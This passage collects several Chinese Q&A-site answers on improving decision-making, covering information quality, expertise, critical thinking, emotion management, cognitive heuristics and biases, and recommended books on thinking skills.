己的精力在自己并不擅长的问题上反复决策。找到合适的事件建立决策机制。在读MBA的时候，各类精彩的活动及讲座应接不暇，而且往往冲突。面对这类互相冲突的活动，常困惑于如何选择，各有利弊各有得失，在权衡多个维度的过程中纠结万分。后来有高人指点，建议一套决策机制然后严格执行，核心是保证决策机制简单而可执行，比如：绅士的机制，参加首先答应的活动，而不能毁约去后来的，哪怕后来的活动更有价值；功利的机制，参加对找工作更有价值的活动，而不管毁约之前的活动会得罪什么样的组织者等等。圈定事件看似简单，然而却极需要生活的智慧。难怪Reinhold Niebuhr给出如下名言，“上帝赐与我宁静去接受不能改变的事实，赐与我勇气去改变我能够改变的事实，赐与智慧去分辨其中的差别。”接下来是不纠结。这点也是说起来容易做起来难，纠结难在选择多，而不是没选择。正所谓Option的反经济学特性（Option的持有本来是带来价值的，而在这里却给持有人带来更多的负面价值）。因此要想不纠结，就是面对没有本质差别的几个选择中做出决定后，迅速制造不能悔改的束缚（法律上或者面子上），让整个人生从纠结中彻底解脱而变得简洁简单，不用在几个方案中反复思考以及选择之后仍然吃着碗里看着锅里得不断后悔。举例如下。拿到两个等量学校的Offer，比如Stanford vs. Harvard。基本常识是这两个学校都差不多，至于什么文化性格匹配我觉得都是二级层面的问题或者做了决定再找理由，根本不用多理。毫不犹豫选择Stanford（选Harvard的人，我也不会粉转黑）或者扔硬币随机选，然后赶紧签约以及通知自己的亲朋好友让自己不能悔改（这样在法律上和社交关系上就产生了不能悔改的束缚），接着订张机票该去哪里玩就去哪里玩儿，怀着对未来的憧憬，接下来的旅游肯定畅快无比。即使Harvard利诱把奖学金翻好几倍或者找Nobel Laureate来做说客，虽然我可能会动心，但是已经和Stanford签了，所以不能改而不能纠结，骂一句Welcome To Finland，继续接着玩。但是，我真心见过这样的人，在两个Offer之间纠结数月，最后扭扭捏捏去了一个A学校或者公司之后，还对B念念不忘纠结好几年的人。再举一个例子。即使刚和老婆（这里换成老板也行）吵完架，跪主板到膝盖红肿，只要觉得还能过下去（除非连续一周坚定地认为，分了好）。出门遇到美女或者初恋（这里可以换成猎头或对手），也是一样表明身份然后秀恩爱或者秀待遇，膝盖那只是换姿势造成的。不要留下任何一个活口或者给自己产生option的机会。否则生活将会异常复杂……做到了“在非重要决策上节省精力+不纠结”，自然会省出来大量的带宽和精力，对于重要决策做出致命一击。 干货长文，良心作答。建议收藏本答案，过几天会继续更新，补充大量干货。再次更新时，会从一个完全不同的角度提供思路。第一次更新是一个实际案例分析，可落地可实操。以下是第一次更新的答案。————————————————我们确实可以通过训练来提高自己的决策能力，但是要找准训练的方向。即，我们要理解，决策能力的影响因素是什么。让我们进入一个案例情景：公司老总让一个中文系毕业的女生接手打理一个微信公众号，因为上一个负责人离职了。这位新入职的女生，她的每天主要工作就是从各种渠道（其他公众号、网站、博客等）寻找搜集文章、判断文章的价值、对文章进行适当的编辑然后发布——简单说，就是选择以怎样的形式发布哪些的文章。公众号每天更新，女生每天都在做决策。她的决策结果会有迅速的反馈——后面两天的流量说明了她的决策是否成功。流量是至关重要的，因为微信是公司的主要影响力和销售平台，公司会在微信的文章末尾挂广告，卖微店产品。现在我们来看看，这位女生一路上会遇到哪些问题？哪些东西在影响她的决策水平？一、最开始的几天，老总发现公众号的流量低于正常值，产品卖不出去，于是老总掏出手机一一查看每天发布的文章，最终得出结论：流量低是因为这些文章的质量确实不高。老总便把女生叫过来谈话：“你对这几天的流量有什么看法？”女生有点尴尬，扭扭捏捏，不好意思的说：“……比较低……”“那么，你认为流量低的原因是什么？”女生想了想，说：“其实我自己也觉得文章的质量不是很好，所以流量比较低。”老总继续追问：“那为什么不选一些质量高的文章呢？”在这样的追问下，女生终于把她的真实困难反应了出来：“我当然想要选择质量高的文章啦，可是就是找不到啊！”“怎么会找不到呢？”老总顿了顿，突然想起了什么，说：“我问你，你每天的信息来源是什么？你关注了多少个其他公众号？”（微信号嘛，大家都知道，不同的号相互转载来转载去的，原创的比较少）女生说：“主要是从其他微信号转载过来的，我每天大概要翻阅十几二十个同行业的公众号呢。”老总听了立刻就笑了：“什么！才十几个？怪不得说找不到好文章呢！你的浏览量太少了，根据之前运营人员的经验，每天浏览其他公众号至少是80+才行，而且不能忽视其他渠道，像知乎、搜狐、新浪博客等，都要适当关注。”于是女生恍然大悟：哦，原来是接触信息少了！于是女生回去按照老总的建议进行修正，果然，选择文章的质量和相应流量就恢复到了原来的正常水平。现在，我们已经发现了影响决策水平的第1个因素了：信息数量。类似的，一个股票短线交易员，每天要浏览几百几千条经济金融信息；公司老总，每当重大决策时都要纵观全公司所有部分信息；选择一个研究方向时，要查阅所有前人的已有研究报告；找工作投递简历时，也要对比尽可能多的公司然后才选择。二、女生的工作开始进入平稳期，每天刷大量公众号，寻找优秀的文章。如果看平均水平，确实是比以前好了，但是老总的眼光非常敏锐，他经过仔细观察，觉得偶尔还是会出现低水平的文章，这个“偶尔”的概率还是偏高了。一旦出现个“偶尔”，公司的产品销量就会降低。于是他继续找到女生，询问相应原因。女生说：“你说的哪些公众号和网站我全都关注了，每天都查看了啊！”老总说：“但是有时候，我发现，某个公众号上出现了一篇好文章，明显是会带来高流量的，你没有选，反而选择了另一篇质量一般的。这是为什么呢？”随后，老总举了几个例子。女生愣住了，很委屈的说：“这个公众号我也是每天都看的，可能偶尔不小心漏掉了吧。但是我确实是很认真的在做事情，只是不可能每天都保持完美状态一个不漏啊。”看起来，女生的话很有道理，毕竟每天刷80+公众号的文章，已经达到人的脑力极限了，这种高压高疲劳情况下，想要保持完美状态实在是不可能的。问题无解了吗？老总一句话就点破关键问题所在：“那是因为你没有监控信息质量，没有按照信息质量进行权重排序。有十几二十个公众号，他们的质量明显高于平均水平，所以在查找信息的时候，如果你的精力顾不过来，你就应该优先查找他们，而适当放弃部分低质量的信息源。”女生又恍然大悟，回去按照老总建议，选出十几个稳定高质量的公众号，按照信息质量分配精力，如此，公众号的文章质量和流量又有一定上升。现在，我们发现了第二个影响决策水平的因素：信息质量。一个股票交易员，当他查阅某条信息的时候，会优先去翻阅人民网、工信部、国务院新闻发布中心等高质量核心信息源，其次才回去看新浪网、东方财富等渠道，最次是股票论坛、贴吧等；做学术研究，主要是看大咖、大牛的学术报告和书籍，精力有剩余才去看二流的研究成果。核心的高质量信息渠道很重。每个行业都有对应的行业网站，从中选优去差，保证自己的信息质量是一件重要的事情。选择所看的书也很重要，有傻白甜美女朋友圈曝自己的书单，尽是《心理学重要的XX条原理》《别让xx类型的朋友害了你》《通往成功的XX社交原理》之类的伪心理学和鸡汤——你觉得这位美女的日常决策水平会怎样？三、女生运营公众号的水平变得更加稳定了，不过，一段时间后，老总也提出了更高的要求。老总发现，虽然日常流量稳定，但是缺乏爆款，缺少10万+的文章。他又去找女生谈话。老总问道：“小李啊，你觉得最近工作怎么样？”女生回答：“我觉得现在工作比较顺了，毕竟比较符合我的专业。我本来就是学中文专业的，每天看看文章，编辑一下文章，还挺顺手的。”学中文的做微信编辑，是不是很专业对口呀？老总听了一下子就着急了，立刻说：“小李，千万不要有这种自我感觉良好的想法！你觉得专业对口，这只是一个表象！要做好微信，不仅仅是文学性的遣词造句而已，更重要的是心理学、传播学、营销学！你在这些领域里缺乏专业知识，是不可能做得好的！”女生又愣住了。“你有没有注意到，现在微信每天流量平稳，但是却极少有10万+的爆款？我仔细研究了你选的文章，发现你的决策里面缺少专业性的传播学和营销学元素。比如，微信朋友圈的社交币原则，你有没有听说过？有没有在刻意使用过？比如，如何给文章取标题，你有没有研究过？有没有一个基于心理学和营销学的常用标题套路？甚至更高难度的，把广告做成产品内容，让内容本身成为广告，这样的方式有没有研究过？这些才是做好微信决策的真正专业必备知识。”女生听的云里雾里，回去猛补心理、营销和传播学的课，希望能够满足老总的高要求。到此，我们发现了影响决策水平的第3个因素：专业知识。专业知识和前面提到的信息质量有重合的部分，但又有显著差异。信息质量可以再找到关键来源后快速提升，但是专业知识需要长期积累和深度理解。专业知识是影响决策的一个非常重要的因素，很多时候是刚性要求，无法通过信息质量、数量和思考能力（稍后会讲到）来补足。一个世界顶级的程序员，你给他提供最全面和高质量的金融信息，他也无法做出一个优秀的金融投资决策。我认为，大部分的决策困境，就是被卡在了专业知识和专业水平的坎上面，尤其是那些影响巨大的重要决策上。比如，衡量一个生鲜投资项目时，在物流、农产品行业事务上的专业有欠缺，就会让你的投资决策就会做的异常艰难且风险很高；考虑从3种昂贵的抗癌药物中选一种，你就不得不求助于最专业的癌症医生。顺带说一句，我一直认为，跨界是一件危险的事情（对大部分人来说跨界基本就代表了不专业），是一件在物联网时代被夸大了作用和被轻视了风险的事情。尤其是个人职业发展和学习，乱跨界是要吃亏的。四、我们的关注点继续回到那个运营微信公众号的女生上面。这一次，她无法快速解决问题了，她的学习进度很慢。比如，她查阅了关于社交币 原则的很多资料，但是在实际应用的时候，常常不得要领，感觉理论使不出来。老总暗暗旁观，在犹豫是否要再次约谈。正在犹豫的时候，女生捅了个大漏子——在头条上放了篇观点有明显纰漏的文章。文章大致是说，中国某高考状元能力低下、心理扭曲，在国外杀了个人，由此推出，中国高分考生大多高分低能，最终强烈呼唤教育改革，放开民办教育政策。老总忍不住了，决定新账旧账一起算。“先说说今天早上发的头条吧。你怎么看这篇文章？”女生没有反应过来，说：“我觉得还可以吧，观点明确，有个性，应该可以涨一些粉。”老总心里一疙瘩，说：“你觉得它的观点怎么样？”女生又说：“我觉得比较合理吧。我查过，确实有这么一个高考状元，他也确实是在美国杀了个人。另外，中国的应试教育高分低能大家都知道，而且文章主要是呼唤教育改革和放开民办教育，这个主张也是合理的，所以我觉得总体还可以。”老总的听得一愣一愣的，仿佛一万只乌鸦从头上飞过，一会儿排成S形，一会儿排成B形。良久，叹了一口气，说：“一个观点，观点本身是合理的，并不代表它的论证是合理的，教育当然需要改革，民办教育当然需要放开，但是这个结论并不能由某个高考状元的心理变态来推导出来，这个个案不具有代表性。即便论据属实，这种论证本身也是不合理的。这篇文章的论证太弱了。”老总叹气总结道：“你缺乏批判性思维的能力”女生继续愣着。老总看她的样子好像一时反应不过来，就转换到另一个话题上：“对了，之前叫你学习传播和营销的，怎么样了？那个社交币的原理，弄懂了吗？”女生回过神来，透露了自己遇到的难题：“理论上弄懂了，但是实际上使用的时候总感觉差点劲儿，用不出来。它要求我们帮助目标群体说话，达到朋友圈的社交表态效果，但是我不是很确定知道目标群体想要表什么态……”老总：“我就知道你会卡在这里，这和你平常表现出来的特质是类似的——缺乏换位思考的能力。你应该换位思考，就把自己当做目标群体，你就是他们，你想想，他们身边都是怎样的人？他每天在做些什么事？哪些是他喜欢的？哪些是他不喜欢的？他的利益在哪里？局限在哪里？你这样设身处地的去思考，其实很容易就能明白，他想要对什么人表什么态度，而我们需要怎样的文章、以怎样的角度代他发言了。”女生点点头，也不知道弄懂了没有。这一部分，我们看见思维方式和思维能力对决策的影响。即便面临同样的信息，不同人也会给出不同的反应，做出不同的决策，这常常就是思维能力的高下造成的区别。你有没有严密的逻辑思维和批判性思维能力？有没有换位思考、理解他人想法的能力？有没有跳脱现有框架、超越局限的创造性思维能力？……这些思维能力的区分，也在很大程度上影响这决策的水平。所以在知乎上，有那么多关于思维方法的问题；所以中国的教育改革，一直在强调要加强思维的教育；所以美国的高等教育变革，最牛的一所学校就是纯思维导向的教育，先学会各类学科的100种思维方式，然后再去实践应用；所以我开一次可视化思维的实体教师培训，仅仅一个“除了思维导图，还有哪些好用的学习工具”的标题就引来了几百报名。……五、再继续回到那个女生的情境中。某个星期，微信流量暴跌，几篇文章出现了明显原则性错误和失误。老总大慌，赶紧找女生问话：“这两天怎么回事？昨天的头条文章基调明显有问题，简直是社交币原则的反例！今天的头条也是奇奇怪怪的，既不新颖奇特，又没有实用工具性，跟目标群体的生活情景也不紧密关联，完全没有看点嘛！另外，这几天的文章标题都很平淡，明显是没有雕琢过的，原来的哪些标题策略呢？怎么不用了？”女生红着眼睛憋出一句：“跟男朋友吵架了，这几天情绪不太稳定。。。”情绪对于决策的影响最明显，最易懂，但仍然值得单独提出来。上面提到专业知识和思维能力的作用很大，但是这两条都是需要长期积累学习的，没法迅速掌握。而情绪对于决策的影响，却是有可能快速消除的。虽然，你很难短期迅速成为一个修为高深波澜不惊的人，你可能还是背负着各种各样的心理阴影，但是通过一些信念和技巧的修正，完全可以做到把情绪缩小到一定范围内，并且转移到不重要的时间和空间去处理，避开做关键决策的那个重要窗口。具体的技巧可以参见如何控制负面情绪？ - 叶修的回答巴菲特再谈到自己的投资理念的时候，连说3遍：不要亏损、不要亏损、不要亏损……看起来像是废话，然而他实际要表达的意思是：规避风险比追求盈利更重要。这个理念在很多时候都是通用的：少做明显的蠢事比多搞出精彩的花样强。情绪管理之于决策就是这样类似的关系：少在情绪波动时做愚蠢的决策就够不错了，因为不管平时的决策多么才华横溢精彩绝伦，其累计收获的成果有可能被一次蠢决定完全抵消掉，还有额外损失。也因为如此，自我情绪管理，是我建议大部分人都可以优先学习的一个领域，这个领域，只要学会了一点点就有很大的作用，并且它没有我们想像的那么难。六、上面这个女生的案例是几个真实案例的混合表达，我们可以从中总结出这几点：信息数量信息质量专业知识思维能力情绪管理这就是影响决策的5个核心因素。其中：信息数量、信息质量可以通过某些关键点的变化而短时间提高（指的是新增速率可以快速改变，但是积累总量的改变要慢些）；情绪管理可以通过部分技巧的学习、联系和信念的改变而较快速的掌握；专业知识、思维能力的提升相对较慢，需要较长时间的积累和训练。然而我要表达的态度是，所有的一切都是可以改变的。不管是情绪管理，还是专业知识，还是思维能力，都确实是可以通过刻意学习和训练得来的。即便有些东西起步时比较难、比较慢，只要你努力学习，总会有相应的提高和进步。不过，我还是要做一点补充说明：高水平的决策是可以练习和追求的，然而完美的决策并不存在，总有某些时候，你会碰到不可决策的情况。比如金融交易中的盈亏同源，你的盈利就来源于那不可消除的风险；比如高中毕业时选的大学专业，一个高中生（包括你的父母亲戚、老师等）就是不可能对社会职业有深刻的理解，怎么决策都是不完善的。这也是我要说的关于决策的最后一点——决策后的心态。决策完了，坦然接受后果。即便错了、损失了，也不用纠结，继续把控好决策过程，准备好下一次决策就行了。我们只需要做到决策前期和过程中的尽心尽力，剩下的结果，就是尽人事听天命了。如果决策完了还不安分，瞻前顾后的，反而有可能让下一个决策错得更离谱。比如，一个优秀的金融交易策略，有70%的准确率（这个胜率已经非常优秀，足够持续稳定盈利了），有些人偶尔一次碰到了那失败的30%，心理波动了，慌了，烦躁了，于是后面几次就不按照固有的策略去做了，结果越做越烂。这在金融交易圈里非常常见（这种心态常见，然而胜率高达70%的策略却不常见）。总结：信息数量、信息质量、专业知识、思维能力、情绪管理，以及决策后的心态。———————————————————————————————————–附：推荐几本书上面提到的因素中，思维能力是无专业限制，所有人都通用的，也是我的研究领域，在此推荐几本思维方面的 “硬书”批判性思维：《批判性思维工具》 这本书是批判性思维领域最经典的一本书了，几乎没有之一。从逻辑陷阱，到批判性思维心态，新版里面甚至还添加了如何用批判性思维的方法学习一门学科！其实已经有点延伸到学习策略的领域了。《学会提问》另外一本经典的批判性思维书籍，不过和上面那本书有不少内容是重复的，也可作推荐。《你以为你以为的就是你以为的吗？》 这是一本既严肃又搞笑的高质量思维书籍，里面有很多测试题，非常有趣，角度也很新颖。当你认为自己的批判性思维能力已经可以的时候，不妨做做里面的测试，会发现，真是机关重重防不胜防，一不小心就中招了！！可以和上面两本配套看。创造性思维：《水平思考法》：这是一本非常经典的小册子，是创造性思维领域的开创性书籍。其他书籍多是讲技巧的，这本书籍讲到了根本，并且告诉你，哪些奇奇怪怪的创造性技巧是怎样从这个根本原理中衍生出去的！《斯坦福大学最受欢迎的创意课》：名字看上去有点水，但是内容还是很经典的。既有创造性思维的技巧，又有创造性思维的环境，还提到创造性思维的心态，角度很全面，值得参考。如果懒得看全书，可以看我对这本书的一篇书评和感悟：读书报告——关于创造力 - 教育微微谈 - 知乎专栏《创造力，心流与创新心理学》：这本书的切入角度比较深刻，从心流的概念一直谈到富有创造力的生活状态，有点洞悉根本的意思。值得认真品味的一本书。其他思维技巧：《金字塔原理》： 最基本的入门书，主要讲的是结构化思维的。虽然基本，但是很必须，值得年轻人和学生们边读边练习。各种思维导图的书籍，随便看一本。不多说了，思维导图现在已经常识化了。但是顺带提一句，思维导图的核心在于层级、分类、发散三个要点，其中层级与分类就是结构化。《六顶思考帽》： 德博诺的一本思维技巧书。重点在于全方位的思考角度。团队开会的时候可以用。所有人都可以看看，尤其推荐高中生、大学生看，想想写作文、辩论赛，或者组织社团活动的时候，搬几个相应的套路出来，足够震慑住一般外行人了。简单易行，装逼必备。《麦肯锡教我的思考武器》：麦肯锡系列的书籍中，我觉得这本最好。既讲了思考的技巧（如何找出有价值的问题、如何面对复杂问题情景等），又讲了部分脑科学的原理，让你知道这些技巧不是凭空来的，是有依据的。内容比较深刻，也比较实用。《穷查理宝典》：每个成功的男人背后，都有一个XXX，而股神巴菲特的背后，就是查理·芒格。查理芒格最出名就是他的多元思维模型——把各个学科的核心思维方式提取出来，为一件事情（对查理芒格来说就是金融投资）进行深度服务。这个思路非常值得提倡。美国高等教育的创新，也在往更加偏重思维的方向前进。比如有一个密涅瓦大学，号称是来颠覆哈佛的，他的核心特色课程，就是大一学生先要学习100种核心思维方式（可惜是保密的，每个入读的学生都要签保密协议，不得外泄），然后在学其他东西，简直是砍瓜切菜，乘风破浪的感觉。上面提到的书，每一本都是高质量的核心书籍，值得反复细看的。手边没资料，暂时就想到这么多了。以后慢慢补充。决策能力的训练，非常依赖于深度学习的策略和方法，比如，你了解各种 心理效应，理论上也能提高自己对人和事情的决策判断。但是你如何学习这些心理效应呢？你真实深刻的理解了吗？你能应用出来吗？决策能力需要训练，而训练的途中也需要各种学习策略和方法。我在问题有哪些令人叫绝的心理学效应？ - 叶修的回答中，提到一些典型的学习策略，可供参考。 5000字大章，干货颇多，可收藏。大脑的决策大致划分为两类：依靠经验为主的经验决策，依靠理性判断的理性决策。日常生活中，除非较为重要的事件，我们通常采用经验决策，虽可能会出错，但我们需要在准确与效率之间做出权衡！如何提高决策能力？要尽可能的做好每一个决策吗？我认为“二八法则”适用于决策，只要我们能辨别并抓住20%的关键决策，提升这些关键决策的准确率，我们的决策水平就会大幅跃升，而试图做好每一个决策只会适得其反！那么，我们如何才能确保在关键时刻能做出正确选择？第一，当然是尽可能根据理性选择做决策，道理很浅显，但执行起来却很难，我们的精力和时间决不允许我们为每个决策深思熟虑，所以我们要做的就是，确保我们尽可能的根据理性决策做关键决策！第二，善用经验决策。经验决策因兼顾了效率，所以在准确率上有所牺牲，而作为基础的决策方式，哪怕很小幅度的改善也会大大提升决策效率。因次，要提高决策能力，需要考虑两个问题：问题一、如何提高在关键时刻理性决策的概率和准确率？问题二、如何善用经验决策？问题一、如何提高在关键时刻理性决策的准确率和概率？1、打破虚妄的自大，接受错误才能减少错误。一个简单的数学题，假如股市处在上升通道，30%可能下跌，70%可能上涨，在100个交易日内如何交易才能最大化收益？先看看包括我在内的大多数“聪明人”的必然选择，因我们想做对每一次交易，所以交易策略必然是70次买入，30次卖出。70次买入中有70%是正确选择（因为上涨的概率是70%），30次卖出中有30%是正确选择（因为下跌概率是30%），所以正确交易：7070%+3030%=49+9=58次。如果我们不试图做对每一个决定，坦然承认并接受自己无法做对每一次预测，坦然接受自己在100次交易中出错30次，即100次全都买入，100*70%=70次，可以保证70次预测正确，而这恰恰也是最佳策略！要知道，每个人的能力是有限的，试图每次都达到最优决策，可能会提高对小众事件的判断力，但却丧失了对更多、更普通事件的预测能力，得不偿失，唯有接受错误才能减少错误，提升准确率！2、形成客观的决策框架。我们做决策，一个最自然的依据是，判断哪个选项会带来最大的收益或最少的损失，而我们对收益的知觉，依赖于形成决策框架的方式，所谓的框架是指对一个选择的描述。比如你打算去相亲，有两个姑娘，媒人分别通过正、反面描述：正面描述：姑娘A：白，富，美，刚和男朋友分手。姑娘B：漂亮，温柔，贤惠，有稳定工作。负面描述：姑娘A：白，富，美，正在寻找接盘侠。姑娘B：漂亮，温柔，贤惠，工资不高。你怎么选，相信在正面描述时，大多数人和我一样，首选白富美，因为收益很明显，但在负面描述时，选择恰恰相反，因为损失太明显！所以，我们面对同一件事情时，决策框架不同，我们会做出完全不同的选择。在生活中，信息框架带来的误导性选择极为普遍，销售员是善用次套路的高手，他们会以一种有利于他的方式构建信息框架，如果他想卖我们东西，肯定是运用收益框架诱惑我们，如果他想买我们东西，肯定会用损失框架打压价格，所以，当我们做决策时，尽量既在收入框架，也在损失框架中考虑问题，这既需要我们能广泛的收集正反资料，也需要对决策框架有所了解。3、理性看待预期情绪。预期情绪是指预测自己将会因某一个决定而体验到的情绪，可以用效用理论来解释预期情绪对决策的影响，正面的预期情绪会有力推动我们做出决定，负面的情绪则相反。需要注意的是，预期情绪只是决策时预测的情绪，与我们在决定后体会到的不符甚至是背离的，而这也是导致我们错误决策的重要原因。我们都知道，同样100块钱，失去的痛苦是得到的快乐的2倍，这就是预期情绪，但科学家又进一步做了实验，测试这个事情果真发生了真实的情绪变化是怎么样的，有趣的一幕出现了，失去的痛苦和得到的快乐，从数值上看是相同的！这可以用归因效应解释，即当我们真的失去了100块钱，我们会合理化的归因以降低痛苦，所以真实的痛苦并不比得到的快乐更大。但如果我们对此不了解，在做决定时，因为预期的损失痛苦会大于获利快乐，所以在面对收益时，我们的决定会趋于保守，影响我们理性决策。那么如何打破预期情绪的误导？关键是建立正确的反馈。临时抱佛脚肯定来不及，功夫肯定在平时，较长用的做法是记录决策时的情绪感受，在做完决策后，在记录心理感受，然后做一个比较，通常三五次就能形成一个正确的反馈和感知，打破误区。4、提高自我意识。此时此刻的理性决策，必然伴随较高的自我意识。任一时刻的精神状态都是由意识和潜意识两个部分组成，两者的比例决定了自我意识程度，自我意识较高（意识占比高）时，我们就能保持警醒，理性行事，而自我意识较低（潜意识占比高）时，我们就容易被本能左右冲动行事。如何保持较高的自我意识？两个方法，一是通过反思、内省，二是牢记目标和愿望。这其实是根本解决之道，具体参见之前的回答：年轻人独自一人居住，如何有效地保持自律？ - 高太爷的回答5、抓住关键时刻。面对买房、择偶等重要事情，我们自然会意识到这是关键时刻，从而慎重决策，但生活中一些小事，虽不起眼却可能是导致重大变化的导火线，如何抓住这些“平常的”关键时刻？如果仔细观察我们会发现，日常生活中我们不经意间就做了无数个决定，所以保持高度警醒是一个辨别的方法，但难度极大且极不现实，通常而言，我们是通过事后的反馈才知道，某个决定带来了重大的影响。以失控为例，比如中午没睡觉有点犯困，所以打开电脑玩会游戏提提神，这个决定导致我在电脑面前坐了一天；以网络诈骗为例，QQ好友求助，可能随手就转过去几百几千乃至几万块钱，事后才知道上当受骗，等等诸如此类的，在做决定时我们很难意识到，唯有通过事后的总结反思才能把握，才可能辨认出更多的“关键时刻”，当再面临类似的决定时，之前的经历就能提供决策参考，虽不确保每次都能把握关键时刻，但至少不再懵懂无知，都点燃导火索了却不自知！至于所如何不断提高事后的总结、反思能力，以前的回答讲过很多，具体参见上面的回答，这里不再赘述。问题二、如何善用经验决策？经验决策是进化论的优势和精华，当我们对某人或某事做判断的时候（比如评价一部电影），并没有权衡所有可用的相关信息，通常只是用到了所有信息中最具代表性的一条或几条，它是有效的也是必须的，因为现代生活越来越复杂、高效，必须在准确与效率之间做出权衡，捷径应受到尊重，生活必须借助自动化思维将时间、精力释放出来，因此要部分容忍这种不完美。经验决策本质上是启发式的，可分为三类，即可用性启发，代表性启发，锚定法。可用性启发法：这与记忆信息的可用性有关，我们的判断基于记忆中易于使用的信息，启发法很有意义，因为绝大多数时候，容易记忆的可用信息会导致正确的判断，只有两种情况下会出现麻烦：1、信息源本身具有偏向性，导致记忆过程产生了一种带有偏向性的信息样本。比如媒体偏爱小概率、劲爆事件，所以我们会夸大小概率事件的发生概率，最为经典的就是媒体喜欢大肆报道飞机事故，让很多人误以为飞机出行不安全，其实正好相反。此外，个人的预设观点也会影响信息源的客观性，以房子为例，有房子的人喜欢浏览房价还会上涨的信息，没房子的人喜欢浏览房价看跌的信息，这种偏见导致我们的记忆出现偏差，从而容易做出错误判断。个人、媒体等固有偏见会扭曲信息源的客观性，给我们提供了一个有缺陷的资料库和记忆库，如何打破这种偏见？我们需要建科学的评估信息源的机制，这是独立思考的前提，这里不再展开，推荐一本经典小书《学会提问》，书中就理性思维和独立判断有深入浅出的介绍。2、储存的记忆不准确，甚至是南辕北辙。为什么很多人控制不了暴饮暴食？就是因为没能建立正确的反馈，我们误将痛苦当成快乐，这需要我们建立正确的事后反馈，如果我们留意观察，我们知道心情郁闷时，暴饮暴食只会让自己更难受、更自责，而适度的锻炼，亲切的交谈却能让大脑分泌血清素、催产素，而这些能让我们真正的感觉良好，所以如果我们能在事后及时记录，及时反馈，我们就能打破误区，逐步梳理并建立精确的记忆库。代表性启发：如果我描述一个人“拿老板的工资睡老板娘”，不用思考都知道我说的是宋喆，因为宋喆符合我描述的特征。代表性启发的核心思想是：人们利用过去的信息来对当前类似的情形进行判断，这是归纳推理的本质。在大多数情况下，只要我们对匹配的特征和范畴没有偏见的观念，沿着现相似性的判断是合理的，然而当代表性使得我们忽视其他类型的相关信息时，就可能让我们误入歧途。比如要去郊游，出门时天气晴朗，但比较保险的办法还是查查天气预报；股市走势判断，如果简单的匹配记忆中的历史走势图，可能会万劫不复。锚定法：当我们对某件事估值时，我们倾向于围绕一个值上下调整换而言之，我们的判断过分稳固地锚定在最初的给定的数字上。较为常见的就是赔偿案件，有经验的律师会给出一个较高的赔偿数字，法官在做裁定时，会下意识地围绕这个赔偿额波动，从而为代理人争取更多的赔偿。此外，有经验的销售员也善用此法，她先会领我们看较贵的区域，将价格锚定在高位上，如果我们不满意，再去看便宜的，这时我们自然而然会觉得价格挺合适，哪怕这个价格其实并不便宜。之所以没介绍针对代表性启发和锚定法的具体提升方法，这是因为不必要，只要我们能对决策有一个反思，了解我们决策的原理和过程，我们自然而然就会调整决策，进而提高决策效率，简单说，知道了就能提高！至此，我们详细介绍了经验决策和理性决策，其实还有一种更为隐晦的决策：杜克大学2006年研究报告表明，每天有40%的行为并不是真正由决定促成的，而是出于习惯。日常生活中，我们根据习惯无意识间就已经作出决定的，而这只能通过事后的反思才可以发觉，比如“学习时习惯性的拿出手机刷朋友圈”等，所以要提高决策水平，必须善用习惯的力量，而这可以通过“打破旧有的坏习惯，培育新的好习惯”实现，这一问题已在公众号发布。 所谓决策能力，实际上是个伪概念，因为是否有决策力，实际上取决于决策带来的结果，这种事后诸葛亮型的伪概念很有迷惑性，是要不得的。抛开决策力，其实工作和生活里最能影响决策结果的能力是分析问题的能力。但在时间紧迫的情形下，大多数人——包括我自己——脑子都是一锅粥的。怎么办？学过围棋没？没有学过的话，学过象棋没？都没学过的话，去稍微学一下吧。棋类竞技都具有时间有限，形势复杂（假设对手与你股相当）的特点。棋手们的训练包括：大量地背定式或棋招，研究对手的惯用套路，以及练习推算目数和对子的价值。所以，如果想要提高在有限时间下的分析（决策）能力，建议事先准备好一套系统的思维方式（定式），然后学会思考未来可能的变数（对手套路），之后再根据自己的价值观去定义一套价值公式（目数计算）。我在我的专栏分别撰文提到过几点。之后做决策就没那么难了：价值/风险最大化呗。 创造多项围棋历史记录的李昌镐有过很经典的一句话：“多出妙手，不如减少失误。这是我拿到大满贯的原因。”生活中也是如此，选择即是自我博弈，想要让自己的选择更优，需要学习如何更好的选择，也更需要学习，如何减少各种心理盲区带来的选择偏差。也只有避免了偏差做出的选择，也才会更加正确。那么，我们都有哪些心理盲区呢？我大概说一些。1.控制感依赖人对熟悉的东西会有更强的控制感，更强的控制感会让我们自我感觉良好。这样，我们做出来的选择往往会更加冒险。心理学上有过几个关于控制感的研究:对环境有一定控制权的囚犯——可以移动椅子，控制电视，并且开关电灯——会较少体验到压力，较少出现健康问题，并且较少有故意破坏行为；给工人完成任务的回旋余地和让他们拥有一些决定权可以改善并且重振士气。但是对控制感也会给我们带来一些的错误选择。比如，我们经常看到的电视剧，经常是在播放较为紧张和让人恐怖的片段插播豪车和名表的广告。他们利用的就是我们的控制感，因为紧张和恐惧会让我们有较高的生理唤醒，但是拥有豪车和名表也会让我们拥有更多的控制感，从而减缓这种不安和恐惧。还有，我们去赌场，赌场都是布置非常豪华，也是因为这个原因，让我们对环境产生控制感，从而玩的更久。所以，以后在做出决定的时候，应该尽可能减少控制感太大影响，比如，让自己所处环境本身就有很高的控制感，这样就可以减少这个选择带来的控制感，影响自己的选择结果。2.验证性偏差还记得我们父母生气经常责怪我们什么吗？是不是经常听到“你总是那么不听话？”“你从来没让我安心过？”这样的绝对化词语呢？这是因为我们会因为场景需要，大脑会选择来验证这个场景的证据，来证明自己是对的。这个时候我们寻找线索的办法更多是外周途径，从我们要的点出发去寻找证据。这样就会陷入证明自己正确的陷阱，从而忽视其他不利的信息，这样的话，得出来的结论往往会让自己做出错误的选择。就拿我们的中国股市来说，一些人总是认为牛市会到来，所以他们经常性去寻找推论出牛市的证据，却一次一次被深套。还有，我们争吵时，也是如此，不能因为一次事件，就彻底否定对方。我们知道自己的这个不足之后，以后在选择说出或者要做什么的时候也会更加注意。3.隧道效应我们的注意力会更多的集中在特殊的部分。心机boy布什曾经对记者说“我要杀死四千万伊拉克人和一个修单车的。”记者就问“为什么要杀死一个修单车的？”肯尼迪对身边的议员笑说“哈哈，我就知道没有人关心伊拉克人的死活，我们的选择是正确的。”其实，肯尼迪利用的就是隧道效应——我们对特殊部分的更多注意。我们不敢去演讲，就是怕别人笑话，但是我们的注意力却集中在那几个会笑话我们的，而不是更多会认真听讲的部分。退一步说，生活中你做什么可能都会有人对你不是很满意，演讲也只是这样普通的事情之一。所以，在做出选择的时候，不要被少数的那些特殊因素而蒙蔽，看不见大体和大多数。4.决策瘫痪心理学家曾经做过一个关于选择的实验。一批大学生被告知参加的是一项市场调查，请他们评价几款巧克力